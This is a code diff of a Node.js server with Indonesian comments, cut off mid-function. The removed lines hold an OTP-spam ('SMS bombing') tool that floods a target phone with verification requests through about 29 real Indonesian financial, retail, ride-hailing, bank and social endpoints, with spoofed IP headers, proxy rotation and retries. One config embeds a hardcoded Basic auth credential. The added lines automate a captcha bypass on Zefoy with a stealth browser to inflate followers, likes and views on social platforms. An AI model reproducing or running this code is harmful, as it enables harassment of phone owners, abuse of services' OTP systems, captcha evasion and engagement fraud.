@@ -9,9 +9,11 @@ const path = require('path');
 const { v4: uuidv4 } = require('uuid');
 const fetch = require('node-fetch');
 const { HttpsProxyAgent } = require('https-proxy-agent');
-const { exec } = require('child_process');
 const cheerio = require('cheerio');
-const FormData = require('form-data');
+const puppeteer = require('puppeteer-extra');
+const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+
+puppeteer.use(StealthPlugin());
 
 const app = express();
 const server = http.createServer(app);
@@ -46,9 +48,7 @@ let db = {
         maintenance: false,
         maintenanceMessage: 'Server sedang dalam perbaikan. Silakan coba lagi nanti.'
     },
-    spamLogs: [],
     stats: {
-        totalOTPSent: 0,
         totalSuntikSent: 0,
         lastReset: Date.now()
     }
@@ -96,19 +96,9 @@ function generateApiKey() {
 }
 
 // ============================================
-// PROXY & USER AGENT ROTATION - ENHANCED
+// USER AGENT ROTATION
 // ============================================
 
-// Daftar proxy gratis (akan dirotasi) - lebih banyak
-const proxyList = [
-    null, // No proxy (direct)
-    'http://proxy1:8080',
-    'http://proxy2:8080',
-    'http://proxy3:8080',
-    // Tambahkan proxy jika punya
-];
-
-// Daftar User Agent - lebih banyak dan bervariasi
 const userAgents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
@@ -116,28 +106,15 @@ const userAgents = [
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
     'Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
-    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'
 ];
 
-// Daftar IP (untuk header X-Forwarded-For) - lebih banyak
 const ipList = [
     '192.168.1.1', '10.0.0.1', '172.16.0.1',
     '203.0.113.1', '198.51.100.1', '192.0.2.1',
     '104.28.0.1', '172.217.0.1', '142.250.0.1',
     '8.8.8.8', '1.1.1.1', '208.67.222.222',
-    '45.33.22.11', '104.16.0.1', '172.64.0.1',
-    '13.107.21.200', '204.79.197.200', '23.216.0.1',
-    '34.120.0.1', '35.186.0.1', '52.0.0.1',
-    '64.233.160.0', '66.249.64.0', '74.125.0.0'
 ];
 
 function getRandomUserAgent() {
@@ -148,21 +125,6 @@ function getRandomIP() {
     return ipList[Math.floor(Math.random() * ipList.length)];
 }
 
-function getRandomProxy() {
-    const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
-    if (proxy) {
-        try {
-            return new HttpsProxyAgent(proxy);
-        } catch (e) {
-            return null;
-        }
-    }
-    return null;
-}
-
-// ============================================
-// HELPER FUNCTIONS
-// ============================================
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 function generateDeviceId() {
@@ -183,796 +145,408 @@ function generateRandomString(length = 10) {
     return result;
 }
 
-function extractTikTokUsername(url) {
-    try {
-        // Coba ekstrak dari URL
-        const patterns = [
-            /tiktok\.com\/@([^\/\?]+)/,
-            /vt\.tiktok\.com\/([^\/\?]+)/,
-            /tiktok\.com\/[^\/]+\/video\/(\d+)/,
-            /tiktok\.com\/@([^\/]+)\/video\/(\d+)/
-        ];
-        
-        for (const pattern of patterns) {
-            const match = url.match(pattern);
-            if (match) {
-                return match[1] || match[0];
-            }
-        }
-        return url;
-    } catch (e) {
-        return url;
-    }
-}
-
-function extractTikTokVideoId(url) {
-    try {
-        const patterns = [
-            /video\/(\d+)/,
-            /share\/(\d+)/,
-            /v\/(\d+)/
-        ];
-        
-        for (const pattern of patterns) {
-            const match = url.match(pattern);
-            if (match) {
-                return match[1];
-            }
-        }
-        return null;
-    } catch (e) {
-        return null;
-    }
-}
-
 // ============================================
-// API OTP - SUPER AGGRESSIVE MODE
+// ZEFOY BYPASS SYSTEM
 // ============================================
 
-const otpServices = [];
+class ZefoyBypass {
+    constructor() {
+        this.browser = null;
+        this.page = null;
+        this.cookies = null;
+        this.isConnected = false;
+        this.lastCaptchaWord = null;
+    }
 
-// Enhanced aggressive request with multiple techniques
-async function aggressiveRequest(url, method, headers, body, retries = 5, useProxy = true) {
-    let lastError = null;
-    const startTime = Date.now();
-    
-    for (let attempt = 0; attempt < retries; attempt++) {
+    async connect() {
         try {
-            const agent = useProxy ? getRandomProxy() : null;
-            const userAgent = getRandomUserAgent();
-            const clientIP = getRandomIP();
-            const deviceId = generateDeviceId();
-            const sessionId = generateRandomString(16);
+            console.log('🔌 Connecting to Zefoy...');
             
-            const requestHeaders = {
-                'User-Agent': userAgent,
-                'Accept': 'application/json, text/plain, */*',
-                'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8,en-US;q=0.7',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Cache-Control': 'no-cache',
-                'Pragma': 'no-cache',
-                'X-Forwarded-For': clientIP,
-                'X-Real-IP': clientIP,
-                'X-Device-ID': deviceId,
-                'X-Session-ID': sessionId,
-                'Connection': 'keep-alive',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-site',
-                'Priority': 'u=1, i',
-                ...headers
-            };
-            
-            const response = await fetch(url, {
-                method: method || 'POST',
-                headers: requestHeaders,
-                body: body,
-                agent: agent,
-                timeout: 30000,
-                followRedirect: true,
-                compress: true,
-                size: 0
+            this.browser = await puppeteer.launch({
+                headless: false,
+                args: [
+                    '--no-sandbox',
+                    '--disable-setuid-sandbox',
+                    '--disable-web-security',
+                    '--disable-features=IsolateOrigins',
+                    '--disable-site-isolation-trials'
+                ]
             });
-            
-            const text = await response.text();
-            const status = response.status;
-            
-            // Cek berbagai kemungkinan success response
-            try {
-                const json = JSON.parse(text);
-                if (
-                    json.code === 0 || 
-                    json.code === '0' || 
-                    json.code === 200 ||
-                    json.code === '200' ||
-                    json.code === 1000 ||
-                    json.success === true || 
-                    json.status === 'success' ||
-                    json.status === 'ok' ||
-                    json.status === 0 ||
-                    json.message === 'success' ||
-                    json.message === 'Success' ||
-                    json.message === 'OTP sent' ||
-                    json.message === 'Kode verifikasi berhasil dikirim' ||
-                    json.message === 'OTP berhasil dikirim' ||
-                    json.message === 'Verification code sent' ||
-                    json.result === 'success' ||
-                    json.data?.success === true ||
-                    json.data?.status === 'success' ||
-                    json.data?.code === 0
-                ) {
-                    return { success: true, data: json, status: status };
-                }
-                
-                // Cek pesan sukses dalam text
-                const textLower = text.toLowerCase();
-                if (
-                    textLower.includes('success') || 
-                    textLower.includes('berhasil') || 
-                    textLower.includes('terkirim') ||
-                    textLower.includes('ok') ||
-                    textLower.includes('sent') ||
-                    textLower.includes('kode verifikasi') ||
-                    textLower.includes('otp')
-                ) {
-                    return { success: true, data: json, status: status };
-                }
-            } catch (e) {
-                // Jika bukan JSON, cek status code
-                if (status === 200 || status === 201 || status === 202 || status === 204 || status === 302) {
-                    return { success: true, data: text, status: status };
-                }
-            }
-            
-            // Jika sampai sini, berarti gagal
-            lastError = `Status ${status}`;
-            
-        } catch (err) {
-            lastError = err.message;
-            console.log(`⚠️ Attempt ${attempt + 1} failed: ${err.message}`);
-        }
-        
-        // Delay eksponensial sebelum retry dengan random jitter
-        const delay = 1000 * Math.pow(1.8, attempt) + Math.random() * 1000;
-        await sleep(delay);
-    }
-    
-    return { success: false, error: lastError };
-}
 
-// Enhanced OTP Services dengan lebih banyak provider
-const otpConfigs = [
-    // Financial Services
-    {
-        name: 'Uangme',
-        url: 'https://api.uangme.com/api/v2/sms_code',
-        body: (p) => JSON.stringify({ phone: p, scene_type: 'login', send_type: 'wp', device_id: generateDeviceId() }),
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
-    },
-    {
-        name: 'PinjamDuit',
-        url: 'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'clientType': 'a', 'appVersion': '5.7.3' },
-        body: (p) => `phone=${p}&sms_useage=0&sms_service=2&from=0`
-    },
-    {
-        name: 'BelanjaParts',
-        url: 'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
-        headers: { 'Content-Type': 'application/json', 'Authorization': 'Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg==' },
-        body: (p) => JSON.stringify({ phone: '62' + p, type: 'register', device_id: generateDeviceId() })
-    },
-    {
-        name: 'Singa',
-        url: 'https://api102.singa.id/new/login/sendWaOtp',
-        headers: { 'Content-Type': 'application/json; charset=utf-8', 'versionName': '2.4.8', 'versionCode': '143' },
-        body: (p) => JSON.stringify({ mobile_phone: p, type: 'mobile', is_switchable: 1, device_id: generateDeviceId() })
-    },
-    {
-        name: 'Cairin',
-        url: 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: (p) => `appVersion=3.0.4&phone=${p}&userImei=${generateDeviceId()}${generateDeviceId()}`
-    },
-    {
-        name: 'Adiraku',
-        url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
-        headers: { 'Content-Type': 'application/json; charset=utf-8' },
-        body: (p) => JSON.stringify({ mobileNumber: p, type: 'prospect-create', channel: 'whatsapp', deviceId: generateDeviceId() })
-    },
-    {
-        name: 'Kredivo',
-        url: 'https://api.kredivo.com/v1/auth/otp',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone_number: p, method: 'whatsapp' })
-    },
-    {
-        name: 'Akulaku',
-        url: 'https://api.akulaku.com/v1/otp/send',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p, type: 'login' })
-    },
-    // E-commerce
-    {
-        name: 'Shopee',
-        url: 'https://shopee.co.id/api/v4/account/phone/request_otp',
-        headers: { 'Content-Type': 'application/json', 'Referer': 'https://shopee.co.id/' },
-        body: (p) => JSON.stringify({ phone: '62' + p, type: 'login' })
-    },
-    {
-        name: 'Tokopedia',
-        url: 'https://api.tokopedia.com/graphql/SendOTP',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ query: 'mutation SendOTP($phone: String!) { sendOTP(phone: $phone) { success message } }', variables: { phone: p } })
-    },
-    {
-        name: 'Lazada',
-        url: 'https://api.lazada.co.id/v1/otp/send',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'Blibli',
-        url: 'https://api.blibli.com/v1/otp/request',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'Bukalapak',
-        url: 'https://api.bukalapak.com/v1/otp/send',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    // Ride Hailing & Payments
-    {
-        name: 'Gojek',
-        url: 'https://api.gojekapi.com/v2/customer/verify/phone',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'Grab',
-        url: 'https://api.grab.com/grabid/v1/otp',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phoneNumber: '62' + p })
-    },
-    {
-        name: 'OVO',
-        url: 'https://api.ovo.id/v2.1/auth/customer/login',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ mobile: '+62' + p })
-    },
-    {
-        name: 'Dana',
-        url: 'https://api.dana.id/v1/auth/request-otp',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phoneNumber: '+62' + p })
-    },
-    {
-        name: 'LinkAja',
-        url: 'https://api.linkaja.com/v1/auth/otp',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    // Travel & Lifestyle
-    {
-        name: 'Traveloka',
-        url: 'https://api.traveloka.com/v1/otp/send',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'KFC',
-        url: 'https://api.kfc.co.id/v1/otp/request',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'McD',
-        url: 'https://api.mcd.co.id/v1/otp/send',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    // Social Media & Entertainment
-    {
-        name: 'TikTok',
-        url: 'https://www.tiktok.com/api/v1/auth/phone/send_code/',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p, type: 'login' })
-    },
-    {
-        name: 'Instagram',
-        url: 'https://i.instagram.com/api/v1/accounts/send_verify_email/',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: (p) => `phone_number=${p}`
-    },
-    {
-        name: 'WhatsApp',
-        url: 'https://api.whatsapp.com/v1/otp/send',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'Telegram',
-        url: 'https://api.telegram.org/bot/sendOTP',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    // Banking Services
-    {
-        name: 'BCA',
-        url: 'https://api.bca.co.id/auth/v1/otp',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'Mandiri',
-        url: 'https://api.mandiri.co.id/v1/auth/otp',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'BRI',
-        url: 'https://api.bri.co.id/v1/auth/otp',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    },
-    {
-        name: 'BNI',
-        url: 'https://api.bni.co.id/v1/auth/otp',
-        headers: { 'Content-Type': 'application/json' },
-        body: (p) => JSON.stringify({ phone: '+62' + p })
-    }
-];
+            this.page = await this.browser.newPage();
+            
+            await this.page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+            await this.page.setViewport({ width: 1920, height: 1080 });
 
-otpConfigs.forEach(config => {
-    otpServices.push({
-        name: config.name,
-        func: async (phone) => {
-            const phone2 = phone.replace(/^0/, '');
-            const result = await aggressiveRequest(
-                config.url,
-                'POST',
-                config.headers || { 'Content-Type': 'application/json' },
-                config.body(phone2),
-                3 // retry 3x
-            );
-            return result.success;
-        }
-    });
-});
-
-console.log(`✅ Total API OTP: ${otpServices.length}`);
-
-// ============================================
-// SPAM OTP - SUPER AGGRESSIVE
-// ============================================
-async function spamOTP(target, count, username, sessionId) {
-    const results = { success: 0, failed: 0, details: [], totalAttempts: 0 };
-    const phone = target.replace(/^\+?62/, '').replace(/\s/g, '');
-    let isStopped = false;
-    
-    if (!global.spamSessions) global.spamSessions = {};
-    global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
-    
-    // Shuffle services for better distribution
-    const shuffledServices = [...otpServices].sort(() => Math.random() - 0.5);
-    
-    // Konfigurasi pengiriman paralel
-    const batchSize = Math.min(5, shuffledServices.length);
-    
-    for (let i = 0; i < count; i++) {
-        if (isStopped) {
-            io.emit('spamProgress', {
-                sessionId, type: 'otp', target,
-                current: i, total: count,
-                success: results.success, failed: results.failed,
-                message: `⛔ Dihentikan!`,
-                stopped: true
+            await this.page.goto('https://zefoy.com', {
+                waitUntil: 'networkidle0',
+                timeout: 60000
             });
-            break;
+
+            await this.page.waitForSelector('.captcha-word, .captcha-text, [class*="captcha"]', {
+                timeout: 15000
+            });
+
+            this.isConnected = true;
+            console.log('✅ Connected to Zefoy!');
+            
+            return true;
+        } catch (error) {
+            console.error('❌ Failed to connect:', error);
+            return false;
         }
-        
-        let roundSuccess = 0;
-        let roundFailed = 0;
-        const serviceResults = [];
-        
-        // Kirim dalam batch paralel
-        const batch = shuffledServices.slice(0, batchSize);
-        const promises = batch.map(async (service) => {
-            try {
-                // Multiple attempts per service
-                let success = false;
-                for (let attempt = 0; attempt < 3; attempt++) {
-                    const result = await service.func(phone);
-                    if (result) {
-                        success = true;
-                        break;
+    }
+
+    async getCaptchaWord() {
+        try {
+            const word = await this.page.evaluate(() => {
+                const selectors = [
+                    '.captcha-word',
+                    '.captcha-text',
+                    '#captcha-word',
+                    '.captcha-container span',
+                    '[class*="captcha"] span',
+                    '.verification-text'
+                ];
+
+                for (const selector of selectors) {
+                    const el = document.querySelector(selector);
+                    if (el) {
+                        let text = el.textContent.trim();
+                        text = text.replace(/[^A-Za-z]/g, '');
+                        if (text.length >= 3) {
+                            return text.toUpperCase();
+                        }
                     }
-                    await sleep(200 + Math.random() * 300);
                 }
-                if (success) {
-                    roundSuccess++;
-                    results.totalAttempts++;
-                    serviceResults.push({ service: service.name, success: true });
-                } else {
-                    roundFailed++;
-                    serviceResults.push({ service: service.name, success: false });
-                }
-            } catch (err) {
-                roundFailed++;
-                serviceResults.push({ service: service.name, success: false, error: err.message });
+
+                const body = document.body.textContent;
+                const match = body.match(/[A-Z]{3,8}/);
+                return match ? match[0] : null;
+            });
+
+            this.lastCaptchaWord = word;
+            return word;
+        } catch (error) {
+            console.error('❌ Error getting captcha:', error);
+            return null;
+        }
+    }
+
+    async submitCaptcha(word) {
+        try {
+            const input = await this.page.$('input[type="text"]');
+            if (input) {
+                await input.click();
+                await input.type(word);
+                console.log('✅ Captcha typed:', word);
             }
-        });
-        
-        await Promise.all(promises);
-        
-        results.success += roundSuccess;
-        results.failed += roundFailed;
-        
-        // Random delay 1-3 detik
-        const delay = 1000 + Math.random() * 2000;
-        await sleep(delay);
-        
-        io.emit('spamProgress', {
-            sessionId, type: 'otp', target,
-            current: i + 1, total: count,
-            success: results.success, failed: results.failed,
-            message: `📤 Round ${i+1}/${count}: ${roundSuccess} ✅, ${roundFailed} ❌ (${Math.round((roundSuccess/(roundSuccess+roundFailed||1))*100)}% sukses)`,
-            details: serviceResults
-        });
+
+            const submitBtn = await this.page.$('button[type="submit"], .submit-btn, .verify-btn');
+            if (submitBtn) {
+                await submitBtn.click();
+                console.log('✅ Submitted captcha');
+                
+                await this.page.waitForNavigation({
+                    timeout: 10000,
+                    waitUntil: 'networkidle0'
+                });
+                
+                this.cookies = await this.page.cookies();
+                return true;
+            }
+
+            return false;
+        } catch (error) {
+            console.error('❌ Error submitting captcha:', error);
+            return false;
+        }
     }
-    
-    if (global.spamSessions && global.spamSessions[sessionId]) {
-        delete global.spamSessions[sessionId];
+
+    async bypass() {
+        let attempts = 0;
+        let success = false;
+        let lastError = '';
+
+        while (attempts < 5 && !success) {
+            attempts++;
+            console.log(`🔄 Bypass attempt ${attempts}/5`);
+
+            const word = await this.getCaptchaWord();
+            if (word) {
+                success = await this.submitCaptcha(word);
+                if (success) {
+                    console.log('🎉 Zefoy bypass successful!');
+                    this.isConnected = true;
+                    return { success: true, word: word, attempts: attempts };
+                } else {
+                    lastError = 'Failed to submit captcha';
+                }
+            } else {
+                lastError = 'Failed to get captcha word';
+            }
+
+            if (!success) {
+                await this.page.reload();
+                await sleep(2000);
+            }
+        }
+
+        this.isConnected = false;
+        return { success: false, error: lastError, attempts: attempts };
     }
-    
-    return results;
+
+    async useService(platform, action, target, count) {
+        try {
+            const serviceMap = {
+                'TikTok': {
+                    'Followers': '/tiktok-followers',
+                    'Likes': '/tiktok-likes',
+                    'Views': '/tiktok-views',
+                    'Shares': '/tiktok-shares'
+                },
+                'Instagram': {
+                    'Followers': '/instagram-followers',
+                    'Likes': '/instagram-likes',
+                    'Views': '/instagram-views'
+                },
+                'YouTube': {
+                    'Subscribers': '/youtube-subscribers',
+                    'Views': '/youtube-views',
+                    'Likes': '/youtube-likes'
+                },
+                'Facebook': {
+                    'Followers': '/facebook-followers',
+                    'Likes': '/facebook-likes',
+                    'Shares': '/facebook-shares'
+                },
+                'Twitter': {
+                    'Followers': '/twitter-followers',
+                    'Likes': '/twitter-likes',
+                    'Retweets': '/twitter-retweets'
+                }
+            };
+
+            const path = serviceMap[platform]?.[action];
+            if (!path) {
+                return { success: false, error: 'Service not found' };
+            }
+
+            await this.page.goto(`https://zefoy.com${path}`, {
+                waitUntil: 'networkidle0'
+            });
+
+            await sleep(2000);
+
+            const input = await this.page.$('input[type="text"], input[placeholder*="username"], input[placeholder*="link"]');
+            if (input) {
+                await input.click();
+                await input.type(target);
+                console.log(`✅ Target entered: ${target}`);
+            }
+
+            const submitBtn = await this.page.$('button[type="submit"], .submit-btn, .send-btn');
+            if (submitBtn) {
+                await submitBtn.click();
+                console.log(`✅ ${platform} ${action} submitted`);
+            }
+
+            await sleep(3000);
+
+            const result = await this.page.evaluate(() => {
+                const statusEl = document.querySelector('.status, .result, .message');
+                return statusEl ? statusEl.textContent : 'Success';
+            });
+
+            return {
+                success: true,
+                message: result || 'Service executed',
+                platform: platform,
+                action: action,
+                target: target,
+                timestamp: Date.now()
+            };
+
+        } catch (error) {
+            console.error('❌ Error using service:', error);
+            return { success: false, error: error.message };
+        }
+    }
+
+    async getCookies() {
+        return this.cookies;
+    }
+
+    async close() {
+        if (this.browser) {
+            await this.browser.close();
+        }
+        this.isConnected = false;
+    }
+
+    async isPageValid() {
+        try {
+            const title = await this.page.title();
+            return title && title.includes('Zefoy');
+        } catch (error) {
+            return false;
+        }
+    }
+
+    async keepAlive() {
+        try {
+            await this.page.goto('https://zefoy.com', {
+                waitUntil: 'networkidle0'
+            });
+            return true;
+        } catch (error) {
+            return false;
+        }
+    }
 }
 
 // ============================================
-// SUNTIK - SUPER AGGRESSIVE MODE
+// GLOBAL ZEFOY INSTANCE
 // ============================================
 
-// Platform config dengan icon yang benar
+let zefoyInstance = null;
+let isZefoyReady = false;
+let zefoyCooldown = false;
+let cooldownTimer = null;
+let serviceResults = {
+    totalSuccess: 0,
+    totalFailed: 0,
+    lastResult: null
+};
+
+async function initZefoy() {
+    if (!zefoyInstance) {
+        zefoyInstance = new ZefoyBypass();
+        const connected = await zefoyInstance.connect();
+        if (connected) {
+            const result = await zefoyInstance.bypass();
+            if (result.success) {
+                isZefoyReady = true;
+                console.log('✅ Zefoy siap digunakan!');
+                return true;
+            } else {
+                console.log(`❌ Bypass gagal: ${result.error}`);
+                return false;
+            }
+        }
+        return false;
+    }
+    return isZefoyReady;
+}
+
+// ============================================
+// SUNTIK FUNCTIONS
+// ============================================
+
 const platformConfigs = {
     'TikTok': {
         icon: 'fab fa-tiktok',
         color: '#000000',
-        actions: ['Followers', 'Likes', 'Views', 'Shares', 'Comments'],
+        actions: ['Followers', 'Likes', 'Views', 'Shares'],
         actionIcons: {
             'Followers': 'fa-users',
             'Likes': 'fa-heart',
             'Views': 'fa-eye',
-            'Shares': 'fa-share-alt',
-            'Comments': 'fa-comment'
+            'Shares': 'fa-share-alt'
         }
     },
     'Instagram': {
         icon: 'fab fa-instagram',
         color: '#E4405F',
-        actions: ['Followers', 'Likes', 'Views', 'Comments'],
+        actions: ['Followers', 'Likes', 'Views'],
         actionIcons: {
             'Followers': 'fa-users',
             'Likes': 'fa-heart',
-            'Views': 'fa-eye',
-            'Comments': 'fa-comment'
+            'Views': 'fa-eye'
         }
     },
     'YouTube': {
         icon: 'fab fa-youtube',
         color: '#FF0000',
-        actions: ['Subscribers', 'Views', 'Likes', 'Comments'],
+        actions: ['Subscribers', 'Views', 'Likes'],
         actionIcons: {
             'Subscribers': 'fa-user-plus',
             'Views': 'fa-eye',
-            'Likes': 'fa-thumbs-up',
-            'Comments': 'fa-comment'
+            'Likes': 'fa-thumbs-up'
         }
     },
     'Facebook': {
         icon: 'fab fa-facebook',
         color: '#1877F2',
-        actions: ['Followers', 'Likes', 'Shares', 'Comments'],
+        actions: ['Followers', 'Likes', 'Shares'],
         actionIcons: {
             'Followers': 'fa-users',
             'Likes': 'fa-thumbs-up',
-            'Shares': 'fa-share-alt',
-            'Comments': 'fa-comment'
+            'Shares': 'fa-share-alt'
         }
     },
     'Twitter': {
         icon: 'fab fa-twitter',
         color: '#1DA1F2',
-        actions: ['Followers', 'Likes', 'Retweets', 'Views'],
+        actions: ['Followers', 'Likes', 'Retweets'],
         actionIcons: {
             'Followers': 'fa-users',
             'Likes': 'fa-heart',
-            'Retweets': 'fa-retweet',
-            'Views': 'fa-eye'
-        }
-    },
-    'Telegram': {
-        icon: 'fab fa-telegram',
-        color: '#0088cc',
-        actions: ['Members', 'Views'],
-        actionIcons: {
-            'Members': 'fa-users',
-            'Views': 'fa-eye'
-        }
-    },
-    'WhatsApp': {
-        icon: 'fab fa-whatsapp',
-        color: '#25D366',
-        actions: ['Views', 'Status Views'],
-        actionIcons: {
-            'Views': 'fa-eye',
-            'Status Views': 'fa-eye'
+            'Retweets': 'fa-retweet'
         }
     }
 };
 
-// Enhanced free suntik services dengan lebih banyak provider
-const freeSuntikServices = [
-    {
-        name: 'Zefoy',
-        baseUrl: 'https://zefoy.com',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook'],
-        captchaRequired: true,
-        methods: ['direct', 'api']
-    },
-    {
-        name: 'SocialBoost',
-        baseUrl: 'https://socialboost.me',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Twitter'],
-        captchaRequired: false,
-        methods: ['api']
-    },
-    {
-        name: 'FreeFollower',
-        baseUrl: 'https://freefollower.co',
-        platforms: ['TikTok', 'Instagram'],
-        captchaRequired: false,
-        methods: ['api']
-    },
-    {
-        name: 'ViralBoost',
-        baseUrl: 'https://viralboost.io',
-        platforms: ['TikTok', 'YouTube', 'Instagram'],
-        captchaRequired: true,
-        methods: ['api']
-    },
-    {
-        name: 'SocialKing',
-        baseUrl: 'https://socialking.io',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook', 'Twitter'],
-        captchaRequired: false,
-        methods: ['api']
-    },
-    {
-        name: 'TikTokBoost',
-        baseUrl: 'https://tiktokboost.com',
-        platforms: ['TikTok'],
-        captchaRequired: false,
-        methods: ['api']
-    },
-    {
-        name: 'InstaFame',
-        baseUrl: 'https://instafame.io',
-        platforms: ['Instagram'],
-        captchaRequired: false,
-        methods: ['api']
-    },
-    {
-        name: 'YTBooster',
-        baseUrl: 'https://ytbooster.com',
-        platforms: ['YouTube'],
-        captchaRequired: false,
-        methods: ['api']
-    },
-    {
-        name: 'SocialMediaPro',
-        baseUrl: 'https://socialmediapro.com',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook', 'Twitter', 'Telegram'],
-        captchaRequired: false,
-        methods: ['api']
-    }
-];
-
-// Enhanced aggressive suntik dengan multiple methods
-async function aggressiveSuntik(target, platform, action, count) {
-    let success = false;
-    let serviceUsed = null;
-    let methodUsed = 'api';
-    
-    // Extraksi username/ID dari URL
-    let targetId = target;
-    if (target.includes('tiktok.com')) {
-        targetId = extractTikTokUsername(target);
-    }
-    
-    // Random delay untuk menghindari detection
-    await sleep(500 + Math.random() * 1500);
-    
-    // Dapatkan service yang mendukung platform ini
-    const availableServices = freeSuntikServices.filter(s => s.platforms.includes(platform));
-    
-    if (availableServices.length === 0) {
-        return { success: false, serviceUsed: null };
-    }
-    
-    // Shuffle services
-    const shuffled = [...availableServices].sort(() => Math.random() - 0.5);
-    
-    for (const service of shuffled) {
-        try {
-            // Multiple method attempts
-            const methods = service.methods || ['api'];
-            for (const method of methods) {
-                let result = false;
-                
-                if (method === 'api') {
-                    result = await tryApiSuntik(service, targetId, platform, action, count);
-                } else if (method === 'direct') {
-                    result = await tryDirectSuntik(service, targetId, platform, action, count);
-                }
-                
-                if (result) {
-                    success = true;
-                    serviceUsed = service.name;
-                    methodUsed = method;
-                    break;
-                }
-            }
-            
-            if (success) break;
-        } catch (err) {
-            console.log(`⚠️ Service ${service.name} error: ${err.message}`);
-        }
-        
-        // Delay sebelum coba service berikutnya
